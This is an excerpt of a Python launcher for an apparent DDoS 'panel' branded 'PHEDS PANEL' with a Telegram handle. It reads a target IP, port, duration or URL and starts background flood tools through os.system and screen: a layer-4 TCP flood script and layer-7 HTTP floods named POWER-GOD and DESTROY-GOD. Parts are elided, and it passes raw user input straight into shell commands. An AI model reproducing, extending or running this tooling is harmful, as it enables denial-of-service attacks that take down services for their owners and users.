...
def help():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi")
...
def layer4():
    ...
    print(f"""\033[36m𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊\033[0m \033[34m𝙋𝙃𝙀𝘿𝙎 𝙋𝘼𝙉𝙀𝙇\033[0m | 𝙐𝙎𝙀𝙍: \033[31m{uname} 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈: @izunbi
            ...
            TYPE: METHOD TIME TARGET IP PORT
    ...
    while True:
        ...
        if sinput == "layer4" or sinput == "l4":
            ...
            try:
                ...
                time = sin.split()[2]
                port = sin.split()[3]
                os.system(f'cd l4 && screen -dm node tcp.js {host} {time} {port}')

            except ValueError:
                layer4()
            except IndexError:
                print("\033[36mExample Usage: TCP [IP] 60 443")

        elif sinput == "POWER-GOD":
            try:
                url = sin.split()[1]
                os.system(f'cd l7 && screen -dm go run POWER-GOD.go {url} 512 100')
            ...
            try:
                url = sin.split()[1]
                os.system(f'cd l7 && screen -dm go run DESTROY-GOD.go -count 1000000000000 -data 100 -url {url}')
